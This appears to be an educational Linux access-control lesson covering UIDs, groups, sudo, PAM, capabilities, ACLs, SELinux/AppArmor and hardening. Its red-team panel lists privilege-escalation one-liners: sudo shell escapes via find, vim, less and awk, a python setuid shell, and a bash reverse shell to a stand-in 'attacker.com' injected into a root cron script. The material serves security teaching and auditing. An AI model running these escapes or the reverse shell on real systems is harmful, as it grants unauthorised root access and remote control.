👤Linux Identity Model — Users, UIDs & the /etc/passwd FilePANEL 01
ℹLinux does not know users by name. The kernel identifies every process and file by numeric UID (User ID) and GID (Group ID). Names are just a human-readable label — /etc/passwd maps name ↔ UID. This distinction matters for forensics and privilege escalation.
UID Ranges — Who Is Who
0
root — UID 0. The only UID the kernel treats as privileged. No DAC restrictions apply. One account.
1 – 999
System / Service Accounts — www-data(33), nobody(65534), sshd(74), mysql(27). No login shell. Run daemons.
1000 – 59999
Regular Users — Human accounts. Created by useradd. Have home dir, login shell, mail spool.
60000 – 65535
Reserved / nobody range — nobody(65534) used for NFS anonymous access and privilege-dropped daemons.

👥Groups — Collective Identity & /etc/groupPANEL 02
Primary vs Supplementary Groups
Every process has one primary GID (from /etc/passwd) and up to 32 supplementary GIDs. New files created by a process are owned by the process's primary GID.

Supplementary groups grant additional access. Being in the sudo group allows sudo. Being in docker group allows running Docker without sudo (effectively root — audit this!). Being in adm allows reading logs.
High-Risk Groups to Audit
sudo / wheel — full root via sudo
docker — mount host FS in container = root
disk — raw disk access (read /dev/sda = read all data)
shadow — read /etc/shadow = crack all passwords
lxd — LXD container = root escape
adm — read system logs (info disclosure)
www-data — web server files (check for secrets in webroot)
/etc/group — group:password:GID:members
root:x:0:
sudo:x:27:alice,bob
docker:x:998:alice ← alice in docker group = effective root!
developers:x:1050:alice,charlie,dave
www-data:x:33:

⚡root User & sudo — Privilege Elevation ArchitecturePANEL 03
root (UID 0) — The Superuser
UID 0 is the kernel's definition of privilege. DAC (Discretionary Access Control) does not apply to UID 0 — root can read/write any file, kill any process, bind any port, load kernel modules, change any UID.

Best practice: direct root login should be disabled. Use sudo for traceability. Root's actions are logged; unlogged direct root access is a forensic blind spot.

Root shell check: cat /etc/passwd | grep ":/bin/bash" — root should be the only UID-0 with a shell.
sudo — Controlled Privilege Delegation
sudo lets a user run specific commands as root (or another user) with full logging to /var/log/auth.log and journald.

Key concepts:
NOPASSWD: — dangerous, allows passwordless elevation
ALL=(ALL:ALL) ALL — full root (same as root account)
Cmnd_Alias — restrict to specific commands
!command — deny specific command (bypassable!)

Never use visudo without understanding the rules. A misconfigured sudoers = game over.
sudo Execution Flow
1
User invokes sudo
alice runs sudo systemctl restart nginx. sudo binary has SUID bit — temporarily runs as root to check policy.
$ sudo systemctl restart nginx
2
sudoers policy check
sudo reads /etc/sudoers and /etc/sudoers.d/*. Checks: Is alice listed? Is this command allowed? Is this host matched?
alice ALL=(ALL) /usr/bin/systemctl restart nginx
3
PAM authentication
sudo invokes PAM to verify alice's identity — typically password prompt. If alice authenticated within timestamp_timeout (default 15min), skip prompt.
[sudo] password for alice: ••••••••
4
Audit log written
Before execution, sudo writes to /var/log/auth.log: who, what command, from where, timestamp. Non-repudiable audit trail.
May 03 10:15:22 lab sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
5
Command executes as root
sudo forks, sets UID=0, executes the command. On completion, drops back to alice's context. Target process was root only for the duration of the command.

🔑PAM — Pluggable Authentication ModulesPANEL 04
What Is PAM?
PAM decouples authentication from applications. Instead of each application implementing its own login logic, they call PAM. PAM consults a chain of modules — each can verify identity, set limits, or enforce policy.

Any service with a file in /etc/pam.d/ uses PAM: login, sshd, sudo, su, gdm, cron. Misconfiguring PAM can lock everyone out or silently bypass authentication.
PAM Module Types
auth — verify identity (password, TOTP, SSH key)
account — check account validity (expired? locked? time restriction?)
password — handle password updates (complexity, history)
session — setup/teardown (mount homedir, set ulimits, log session)
PAM Control Flags — How Failures Are Handled

🎯Linux Capabilities — Fine-Grained Privilege ModelPANEL 05
ℹTraditionally: root = all privileges or nothing. Capabilities split root's power into ~40 independent tokens. A process can have specific capabilities without being fully root. Example: nginx can bind port 80 with only CAP_NET_BIND_SERVICE — no other root powers needed.
CAP_NET_BIND_SERVICE
Bind to ports below 1024 (privileged ports). Webservers, SSH daemon.
LOW RISK
CAP_NET_RAW
Create raw sockets. Needed by ping, tcpdump, nmap.
MEDIUM RISK
CAP_SYS_PTRACE
Trace/debug any process (ptrace syscall). Debuggers, strace.
HIGH RISK
CAP_SYS_ADMIN
Massive: mount/unmount, chroot, sethostname, many more. Effectively root.
CRITICAL
CAP_CHOWN
Change file UID/GID arbitrarily. Can chown /etc/shadow to self.
HIGH RISK
CAP_DAC_OVERRIDE
Bypass all DAC file permission checks. Read any file regardless of rwx.
CRITICAL
CAP_SETUID
Set arbitrary UIDs. Process can become root (UID 0) at will.
CRITICAL
CAP_SYS_MODULE
Load/unload kernel modules. One malicious module = full kernel compromise.
CRITICAL

⛔Red Team: Privilege escalation = going from low-privilege user → root. Linux misconfigurations make this the most common post-exploitation technique. Every one of these vectors has been used in real-world breaches.
Common Privilege Escalation Chains
① SUID Binary Abuse
Regular user

→
Exploit binary
GTFOBins technique
→

Example: sudo find / -exec /bin/sh \; or python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' if python has cap_setuid
② sudo Misconfiguration
alice ALL=(ALL) /usr/bin/vim → sudo vim → :!/bin/bash → root shell
alice ALL=(ALL) /usr/bin/less → sudo less /etc/passwd → !/bin/bash → root shell
alice ALL=(ALL) /usr/bin/awk → sudo awk 'BEGIN {system("/bin/bash")}'
alice ALL=(ALL) /usr/bin/python3 /opt/script.py → if script.py is writable, replace contents with os.system('/bin/bash')
Reference: GTFOBins (gtfobins.github.io) — comprehensive list of sudo/SUID escape techniques
③ World-Writable Cron / Script Run as Root
root's crontab runs: /opt/scripts/backup.sh every minute
backup.sh permissions: -rwxrwxrwx (world-writable!)
Attack: echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /opt/scripts/backup.sh
Result: Within 60s, root reverse shell to attacker
④ PATH Hijacking
SUID binary or sudo script calls system("ps") without full path → attacker creates /tmp/ps with malicious content → prepend /tmp to PATH → SUID binary runs attacker's ps as root.
Fix: Always use absolute paths in scripts run as root. sudo sets secure_path.
⑤ Kernel Exploits
Dirty COW (CVE-2016-5195), DirtyCred (CVE-2022-2588), Netfilter (CVE-2022-25636) — race conditions or type confusion in kernel give any user root.
Check: uname -r → compare against known vulnerable kernels. linux-exploit-suggester.sh automates this.

📋Access Control Lists (ACLs) — Beyond rwxPANEL 07
Why ACLs?
Standard Unix permissions support only one owner + one group + others. ACLs extend this to arbitrary users and groups per file.

Scenario: /var/reports/ — root owns it, sysadmin group has rw, but you also need to give specific access to contractor1 (r) and finance_bot (rw) without adding them to sysadmin group.

The effective mask limits the maximum permissions any ACL entry can have. It's recalculated when group or ACL entries change.
ACL Inheritance (Default ACLs)
Set default ACLs on a directory — all new files created inside automatically inherit those ACLs.

setfacl -d -m u:bob:rx /data/shared

New files in /data/shared will grant bob read+execute automatically. Critical for shared directories where new files must always have consistent permissions.

🔒Security Hardening — IAM Checklist & Defence-in-DepthPANEL 09
Attack Surface — IAM Weaknesses
  • ›Second UID-0 account in /etc/passwd (backdoor)
  • ›NOPASSWD sudo rules — no authentication required
  • ›Users in docker/disk/shadow groups — implicit root
  • ›Weak PAM config — MD5 passwords, no lockout policy

  • ›Disable root SSH login: PermitRootLogin no in sshd_config

  • ›Deploy auditd rules watching /etc/passwd, /etc/sudoers, /etc/shadow

🛡SELinux & AppArmor — Mandatory Access Control (MAC)PANEL 10
SELinux — Label-Based MAC (RHEL/CentOS/Fedora)
Every process and file gets a security label (user:role:type:level). The SELinux policy defines which types can access which other types — regardless of DAC permissions.

Even if root tries to read a file with the wrong type, SELinux can deny it. This confines kernel exploits — compromised nginx cannot read /etc/shadow if policy denies httpd_t → shadow_t.

Modes: Enforcing (blocks + logs), Permissive (logs only), Disabled (off — bad).
AppArmor — Path-Based MAC (Ubuntu/Debian)
AppArmor profiles restrict programs by filesystem path. Simpler than SELinux. Profile defines: which files the process can read/write/execute, which capabilities it can use, which network operations are allowed.

Profiles in /etc/apparmor.d/. Modes: enforce (block violations) and complain (log only — for writing new profiles).

Default profiles on Ubuntu: nginx, mysqld, sshd, cups, snapd — all confined.

◉Summary — Step 4 CompletePANEL 13
Identity & Users
Linux uses numeric UIDs — UID 0 = root, no exceptions. /etc/passwd maps names to UIDs. /etc/shadow stores hashed passwords (SHA-512). Service accounts use nologin shell. Always audit for UID-0 duplicates and empty passwords.
sudo + PAM + Capabilities
sudo delegates specific commands with full audit trail. PAM is a modular auth stack — controls login, lockout, MFA, limits. Capabilities split root power into 40 tokens — prefer capabilities over SUID. Audit: getcap, sudo -l, faillock.
MAC + PrivEsc + Monitoring
SELinux/AppArmor add mandatory layer above DAC — even root is restricted. PrivEsc paths: SUID, sudo misconfig, writable cron, PATH hijack, kernel CVEs. Detect via auditd, auth.log, last, w, AVC denials.
